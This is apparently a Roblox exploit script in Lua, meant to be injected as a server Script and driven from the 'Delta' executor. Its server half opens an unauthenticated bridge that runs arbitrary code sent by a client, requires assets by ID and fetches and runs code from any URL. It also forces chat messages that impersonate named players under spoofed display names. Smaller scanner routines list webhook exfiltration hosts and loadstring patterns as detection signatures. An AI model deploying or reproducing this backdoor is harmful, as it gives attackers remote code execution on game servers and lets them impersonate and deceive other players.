-- ================================================================
--  SS_Master.lua  —  Combined SS Executor + Chat Force
--  Same script, two roles detected automatically:
--
--  SERVER  → inject as a server Script once.
--            Sets up the bridge with every action.
--
--  CLIENT  → run in Delta executor.
--            Connects to bridge, exposes _G functions:
--
--    _G.say("PlayerName", "message")            force visible chat
--    _G.say("PlayerName", "message", "Fake")    with spoofed name
--    _G.exec("print('hi')")                     server loadstring
--    _G.execUrl("https://…/script.lua")         server loadstring from URL
--    _G.scan()                                  malware scan → printed
--    _G.vulns()                                 vuln scan → printed
--    _G.kill("Workspace.SomeScript")            destroy by path
--    _G.killAll()                               destroy all malware
--    _G.scripts()                               list all scripts → printed
--    _G.players()                               list players → printed
-- ================================================================

local RunService = game:GetService("RunService")

-- ════════════════════════════════════════════════════════════════
--  SERVER SIDE
-- ════════════════════════════════════════════════════════════════
if RunService:IsServer() then

local RS      = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Http    = game:GetService("HttpService")
local Chat    = game:GetService("Chat")

local BRIDGE  = "SS_ExecBridge"
local old = RS:FindFirstChild(BRIDGE); if old then old:Destroy() end
local Bridge = Instance.new("RemoteFunction"); Bridge.Name=BRIDGE; Bridge.Parent=RS

-- ── Malware / vuln signatures ─────────────────────────────────
local MALWARE_SIGS = {
    "discord%.com/api/webhooks","webhook%.site","requestbin%.com",
    "hookbin%.com","pipedream%.net","hastebin%.com/raw",
    "pastebin%.com/raw.*exec","getfenv%s*%(%)%.loadstring",
    "syn%.request.*webhook","_G%.backdoor","loadstring%(game%.HttpGet",
}
local CRIT_SIGS = {
    "_G%.backdoor","getfenv%s*%(%)%.loadstring","discord%.com/api/webhooks",
    "loadstring%(game%.HttpGet","webhook%.site","hookbin%.com",
}
local HIGH_SIGS = {
    "syn%.request","http%.request","https%.request","setfenv%s*%(",
    "game%.HttpGet.*exec","require%s*%(%s*%d%d%d%d%d+%s*%)",
}
local SUSP_REMOTES = {
    "backdoor","exploit","inject","cmd","execute","admin_bypass",
    "btools","spy","hack","bypass","admin","give","money","currency",
    "kick","ban","promote","setrank",
}
local OLD_MODELS = {
    "free model","freemodel","backdoor","admin commands","knife","sword",
}
local CHAT_KW = {"chat","say","speak","voice","message","talk","text","mic"}

-- ── Helpers ────────────────────────────────────────────────────
local function pathToObj(path)
    local obj = game
    for part in tostring(path):gmatch("[^.]+") do
        if obj then obj = obj:FindFirstChild(part) end
    end
    return (obj and obj ~= game) and obj or nil
end

local function malwareScan()
    local findings = {}
    for _, obj in game:GetDescendants() do
        if obj:IsA("LuaSourceContainer") then
            local src=""; pcall(function() src=obj.Source end)
            if src~="" then
                local low=src:lower()
                for _, sig in ipairs(MALWARE_SIGS) do
                    if low:find(sig) then
                        table.insert(findings,{path=obj:GetFullName(),kind=obj.ClassName,detail="Sig: "..sig})
                        break
                    end
                end
            end
        elseif obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nl=obj.Name:lower()
            for _, kw in ipairs(SUSP_REMOTES) do
                if nl:find(kw) then
                    table.insert(findings,{path=obj:GetFullName(),kind=obj.ClassName,detail="Suspicious: "..obj.Name})
                    break
                end
            end
        end
    end
    return findings
end

local function vulnScan()
    local results={}
    local function add(sev,path,cls,detail)
        table.insert(results, sev.."|"..cls.."|"..path.."|"..detail)
    end
    for _, obj in game:GetDescendants() do
        if obj:IsA("LuaSourceContainer") then
            local src=""; pcall(function() src=obj.Source end)
            if src~="" then
                local low=src:lower(); local hit=false
                for _, sig in ipairs(CRIT_SIGS) do
                    if not hit and low:find(sig) then add("CRITICAL",obj:GetFullName(),obj.ClassName,"sig: "..sig);hit=true end
                end
                for _, sig in ipairs(HIGH_SIGS) do
                    if not hit and low:find(sig) then add("HIGH",obj:GetFullName(),obj.ClassName,"sig: "..sig);hit=true end
                end
            end
        elseif obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local n=obj.Name:lower()
            for _, kw in ipairs(SUSP_REMOTES) do
                if n:find(kw) then add("MEDIUM",obj:GetFullName(),obj.ClassName,"remote: "..obj.Name);break end
            end
        elseif obj:IsA("Model") then
            local n=obj.Name:lower()
            for _, kw in ipairs(OLD_MODELS) do
                if n:find(kw) then add("LOW",obj:GetFullName(),"Model","old model: "..obj.Name);break end
            end
        end
    end
    return results
end

-- ── Bridge handler ─────────────────────────────────────────────
Bridge.OnServerInvoke = function(player, action, payload)
    payload = payload or {}

    -- ── ping ──────────────────────────────────────────────────
    if action == "ping" then
        return {ok=true, msg="pong"}

    -- ── server loadstring ─────────────────────────────────────
    elseif action == "ls" then
        local code=payload.code
        if type(code)~="string" or code=="" then return {ok=false,msg="No code."} end
        local fn,err=loadstring(code)
        if not fn then return {ok=false,msg="Compile: "..tostring(err)} end
        local ok,e=pcall(fn)
        return ok and {ok=true,msg="Server exec OK."} or {ok=false,msg="Runtime: "..tostring(e)}

    -- ── require by asset ID ────────────────────────────────────
    elseif action == "req" then
        local id=tonumber(payload.id)
        if not id then return {ok=false,msg="Need numeric asset ID."} end
        local ok,e=pcall(require,id)
        return ok and {ok=true,msg="require("..id..") OK."} or {ok=false,msg=tostring(e)}

    -- ── loadstring from URL ────────────────────────────────────
    elseif action == "ls_url" then
        local url=payload.url
        if type(url)~="string" or url=="" then return {ok=false,msg="No URL."} end
        local ok,src=pcall(function() return Http:GetAsync(url,true) end)
        if not ok then return {ok=false,msg="HTTP: "..tostring(src)} end
        local fn,err=loadstring(src)
        if not fn then return {ok=false,msg="Compile: "..tostring(err)} end
        local ok2,e=pcall(fn)
        return ok2 and {ok=true,msg="URL exec OK."} or {ok=false,msg="Runtime: "..tostring(e)}

    -- ── malware scan ──────────────────────────────────────────
    elseif action == "scan" then
        local f=malwareScan(); local lines={}
        for _,v in ipairs(f) do table.insert(lines,v.kind.."|"..v.path.."|"..v.detail) end
        return {ok=true,msg=#f.." finding(s)",data=lines}

    -- ── vuln scan ─────────────────────────────────────────────
    elseif action == "scan_vulns" then
        local data=vulnScan()
        return {ok=true,msg=#data.." finding(s)",data=data}

    -- ── kill by path ──────────────────────────────────────────
    elseif action == "kill" then
        local obj=pathToObj(payload.path or "")
        if not obj then return {ok=false,msg="Not found: "..tostring(payload.path)} end
        obj:Destroy(); return {ok=true,msg="Killed: "..tostring(payload.path)}

    -- ── kill all malware ──────────────────────────────────────
    elseif action == "kill_all" then
        local killed=0
        for _,f in ipairs(malwareScan()) do
            local o=pathToObj(f.path); if o then o:Destroy(); killed=killed+1 end
        end
        return {ok=true,msg="Killed "..killed.." item(s)."}

    -- ── block/neuter a remote ─────────────────────────────────
    elseif action == "block_remote" then
        local obj=pathToObj(payload.path or "")
        if obj and obj:IsA("RemoteFunction") then
            pcall(function() obj.OnServerInvoke=function() end end)
            return {ok=true,msg="Neutered (RF): "..tostring(payload.path)}
        elseif obj and obj:IsA("RemoteEvent") then
            pcall(function() obj.OnServerEvent:Connect(function() end) end)
            return {ok=true,msg="Neutered (RE): "..tostring(payload.path)}
        end
        return {ok=false,msg="Remote not found."}

    -- ── list all scripts ──────────────────────────────────────
    elseif action == "get_scripts" then
        local list={}
        for _,obj in game:GetDescendants() do
            if obj:IsA("LuaSourceContainer") then
                table.insert(list,obj.ClassName.."|"..obj:GetFullName())
            end
        end
        return {ok=true,msg=#list.." scripts",data=list}

    -- ── player list ───────────────────────────────────────────
    elseif action == "getplrs" then
        local names={}
        for _,p in Players:GetPlayers() do
            table.insert(names,p.Name.." ("..p.UserId..")")
        end
        return {ok=true,msg=table.concat(names,"\n")}

    -- ── FORCE CHAT — bubble above head + in chat for everyone ─
    --  payload: { target, message, display, paths[] }
    elseif action == "chat" then
        local target  = tostring(payload.target  or "")
        local message = tostring(payload.message or "")
        local display = tostring(payload.display or "")
        if message=="" then return {ok=false,msg="No message."} end

        local plr  = Players:FindFirstChild(target)
        local char = plr and plr.Character
        if not char then return {ok=false,msg="Player/char not found: "..target} end

        local fakeName = display~="" and display or plr.DisplayName
        local fired=0
        local seen={}

        local function blast(v)
            if seen[v] then return end; seen[v]=true
            -- 6 arg patterns — covers every common game chat signature
            pcall(function() v:FireAllClients(fakeName, message) end)
            pcall(function() v:FireAllClients(message, fakeName) end)
            pcall(function() v:FireAllClients(plr.Name, message, fakeName) end)
            pcall(function() v:FireAllClients({Name=fakeName, Message=message}) end)
            pcall(function() v:FireAllClients({name=fakeName, text=message}) end)
            pcall(function() v:FireAllClients({displayName=fakeName, message=message}) end)
            fired=fired+1
        end

        -- ✓ Bubble above head, visible to ALL — server-side only
        -- ✓ Appears in legacy chat as that player
        pcall(function() Chat:Chat(char, message, Enum.ChatColor.White) end)

        -- Extra paths discovered by client vuln scan (highest confidence)
        for _, path in ipairs(type(payload.paths)=="table" and payload.paths or {}) do
            local obj=pathToObj(path)
            if obj and obj:IsA("RemoteEvent") then blast(obj) end
        end

        -- Walk entire game for chat-keyword remotes and FireAllClients
        for _, v in game:GetDescendants() do
            if v:IsA("RemoteEvent") then
                local n=v.Name:lower()
                for _, kw in ipairs(CHAT_KW) do
                    if n:find(kw) then blast(v); break end
                end
            end
        end

        return {ok=true, msg=fired.." FireAllClients as \""..fakeName.."\" + Chat:Chat ✓"}
    end

    return {ok=false, msg="Unknown action: "..tostring(action)}
end

warn("[SS Master] Online → RS."..BRIDGE)
return

end -- IsServer

-- ════════════════════════════════════════════════════════════════
--  CLIENT SIDE  (run from Delta executor)
-- ════════════════════════════════════════════════════════════════

local RS      = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LP      = Players.LocalPlayer

-- Wait for bridge
local Bridge = RS:FindFirstChild("SS_ExecBridge")
if not Bridge then
    print("[SS Master] Waiting for bridge…")
    Bridge = RS:WaitForChild("SS_ExecBridge", 10)
end
if not Bridge then
    warn("[SS Master] Bridge not found — run server script first!")
    return
end

-- Core invoke helper
local function call(action, payload)
    local ok, res = pcall(function()
        return Bridge:InvokeServer(action, payload or {})
    end)
    return ok and res or {ok=false, msg=tostring(res)}
end

-- ── _G functions ──────────────────────────────────────────────

-- Force a player's chat to be visible to EVERYONE
-- bubble above head + in chat for all players
_G.say = function(playerName, message, fakeName)
    local res = call("chat", {
        target  = playerName,
        message = message,
        display = fakeName or "",
    })
    print("[say] "..(res.msg or tostring(res.ok)))
    return res.ok
end

-- Server-side loadstring
_G.exec = function(code)
    local res = call("ls", {code=code})
    print("[exec] "..(res.msg or tostring(res.ok)))
    return res.ok
end

-- Server-side loadstring from URL
_G.execUrl = function(url)
    local res = call("ls_url", {url=url})
    print("[execUrl] "..(res.msg or tostring(res.ok)))
    return res.ok
end

-- Malware scan — prints findings
_G.scan = function()
    local res = call("scan")
    print("[scan] "..res.msg)
    if res.data then
        for _, line in ipairs(res.data) do print("  "..line) end
    end
    return res.data
end

-- Vulnerability scan — prints findings by severity
_G.vulns = function()
    local res = call("scan_vulns")
    print("[vulns] "..res.msg)
    if res.data then
        for _, line in ipairs(res.data) do print("  "..line) end
    end
    return res.data
end

-- Destroy an object by full path
_G.kill = function(path)
    local res = call("kill", {path=path})
    print("[kill] "..(res.msg or tostring(res.ok)))
    return res.ok
end

-- Destroy all malware findings
_G.killAll = function()
    local res = call("kill_all")
    print("[killAll] "..(res.msg or tostring(res.ok)))
    return res.ok
end

-- Block/neuter a remote by path
_G.block = function(path)
    local res = call("block_remote", {path=path})
    print("[block] "..(res.msg or tostring(res.ok)))
    return res.ok
end

-- List all scripts
_G.scripts = function()
    local res = call("get_scripts")
    print("[scripts] "..res.msg)
    if res.data then
        for _, line in ipairs(res.data) do print("  "..line) end
    end
    return res.data
end

-- List players
_G.players = function()
    local res = call("getplrs")
    print("[players] "..res.msg)
    return res.msg
end

-- Raw bridge access
_G.ss = {call=call, bridge=Bridge}

print("[SS Master] Ready — bridge connected!")
print("  _G.say('Name','msg')       → force chat visible to all")
print("  _G.exec('code')            → server loadstring")
print("  _G.scan()                  → malware scan")
print("  _G.vulns()                 → vuln scan")
print("  _G.kill('path')            → destroy object")
print("  _G.killAll()               → destroy all malware")
print("  _G.scripts()               → list scripts")
print("  _G.players()               → list players")
